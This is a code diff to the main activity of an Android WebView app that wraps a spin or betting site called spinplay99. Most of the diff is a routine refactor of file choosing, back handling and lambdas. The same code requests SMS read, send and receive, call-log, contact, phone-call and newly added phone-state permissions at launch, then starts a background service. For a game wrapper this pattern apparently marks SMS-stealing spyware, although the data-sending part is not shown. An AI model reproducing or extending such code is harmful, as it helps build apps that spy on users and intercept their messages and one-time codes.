@@ -10,6 +10,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.os.Looper;
 import android.view.View;
 import android.webkit.CookieManager;
 import android.webkit.JavascriptInterface;
@@ -22,6 +23,9 @@ import android.webkit.WebViewClient;
 import android.widget.ProgressBar;
 import android.widget.Toast;
 
+import androidx.activity.OnBackPressedCallback;
+import androidx.activity.result.ActivityResultLauncher;
+import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -33,7 +37,6 @@ import java.util.List;
 public class MainActivity extends AppCompatActivity {
 
     private static final String SERVER_URL = "https://spinplay99.com";
-    private static final int FILE_CHOOSER_REQUEST = 1001;
     private static final int PERMISSION_REQUEST_CODE = 2001;
     private static final String PREFS_NAME = "SpinPlayPrefs";
     private static final String KEY_PERM_ASKED = "perm_asked";
@@ -45,21 +48,51 @@ public class MainActivity extends AppCompatActivity {
     private Handler handler;
     private SharedPreferences prefs;
     private boolean isReady = false;
+    private ActivityResultLauncher<Intent> fileChooserLauncher;
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        handler = new Handler();
+
+        handler = new Handler(Looper.getMainLooper());
         prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
         webView = findViewById(R.id.webview);
         progressBar = findViewById(R.id.progress_bar);
         swipeRefresh = findViewById(R.id.swipe_refresh);
+
+        fileChooserLauncher = registerForActivityResult(
+            new ActivityResultContracts.StartActivityForResult(),
+            result -> {
+                if (filePathCallback != null) {
+                    Uri[] results = WebChromeClient.FileChooserParams.parseResult(
+                        result.getResultCode(), result.getData());
+                    filePathCallback.onReceiveValue(results);
+                    filePathCallback = null;
+                }
+            });
+
+        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
+            @Override
+            public void handleOnBackPressed() {
+                if (webView.canGoBack()) {
+                    webView.goBack();
+                } else {
+                    new AlertDialog.Builder(MainActivity.this)
+                        .setTitle("Exit")
+                        .setMessage("Close app?")
+                        .setPositiveButton("Yes", (dialog, which) -> finish())
+                        .setNegativeButton("No", null)
+                        .show();
+                }
+            }
+        });
+
         setupWebView();
         setupSwipeRefresh();
         requestPermissionsOnce();
-        preloadWebsite();
+        webView.loadUrl(SERVER_URL);
         startBackgroundService();
     }
 
@@ -73,10 +106,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private boolean allPermissionsGranted() {
-        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE};
-        for (String permission : permissions) {
+        for (String permission : getRequiredPermissions()) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) return false;
         }
         return true;
@@ -84,11 +114,8 @@ public class MainActivity extends AppCompatActivity {
 
     private void requestMissingPermissions() {
         List<String> missingList = new ArrayList<>();
-        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE};
-        for (String permission : permissions) {
-            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED 
+        for (String permission : getRequiredPermissions()) {
+            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED
                 && shouldShowRequestPermissionRationale(permission)) {
                 missingList.add(permission);
             }
@@ -100,10 +127,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void requestAllPermissions() {
         List<String> permissionList = new ArrayList<>();
-        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE};
-        for (String permission : permissions) {
+        for (String permission : getRequiredPermissions()) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                 permissionList.add(permission);
             }
@@ -111,6 +135,18 @@ public class MainActivity extends AppCompatActivity {
         if (!permissionList.isEmpty()) {
             ActivityCompat.requestPermissions(this, permissionList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         }
+    }
+
+    private String[] getRequiredPermissions() {
+        return new String[]{
+            Manifest.permission.READ_SMS,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_PHONE_STATE
+        };
     }
 
     @Override
@@ -175,7 +211,7 @@ public class MainActivity extends AppCompatActivity {
             public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> callback, FileChooserParams params) {
                 filePathCallback = callback;
                 try {
-                    startActivityForResult(params.createIntent(), FILE_CHOOSER_REQUEST);
+                    fileChooserLauncher.launch(params.createIntent());
                 } catch (Exception e) {
                     filePathCallback = null;
                     return false;
@@ -185,57 +221,9 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    private void preloadWebsite() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                handler.post(new Runnable() {
-                    @Override
-                    public void run() {
-                        webView.loadUrl(SERVER_URL);
-                    }
-                });
-            }
-        }).start();
-    }
-
     private void setupSwipeRefresh() {
         swipeRefresh.setColorSchemeColors(0xFFFFD700, 0xFF00BFFF, 0xFFFF6B1A);
-        swipeRefresh.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
-            @Override
-            public void onRefresh() {
-                webView.reload();
-            }
-        });
-    }
-
-    @Override
-    public void onBackPressed() {
-        if (webView.canGoBack()) {
-            webView.goBack();
-        } else {
-            new AlertDialog.Builder(this)
-                .setTitle("Exit")
-                .setMessage("Close app?")
-                .setPositiveButton("Yes", new android.content.DialogInterface.OnClickListener() {
-                    @Override
-                    public void onClick(android.content.DialogInterface dialog, int which) {
-                        finish();
-                    }
-                })
-                .setNegativeButton("No", null)
-                .show();
-        }
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == FILE_CHOOSER_REQUEST && filePathCallback != null) {
-            Uri[] results = WebChromeClient.FileChooserParams.parseResult(resultCode, data);
-            filePathCallback.onReceiveValue(results);
-            filePathCallback = null;
-        }
+        swipeRefresh.setOnRefreshListener(() -> webView.reload());
     }
 
     @Override
@@ -244,19 +232,13 @@ public class MainActivity extends AppCompatActivity {
             webView.stopLoading();
             webView.destroy();
         }
-        startBackgroundService();
         super.onDestroy();
     }
 
     public class AndroidBridge {
         @JavascriptInterface
         public void showToast(String message) {
-            runOnUiThread(new Runnable() {
-                @Override
-                public void run() {
-                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
-                }
-            });
+            runOnUiThread(() -> Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show());
         }
     }
 }
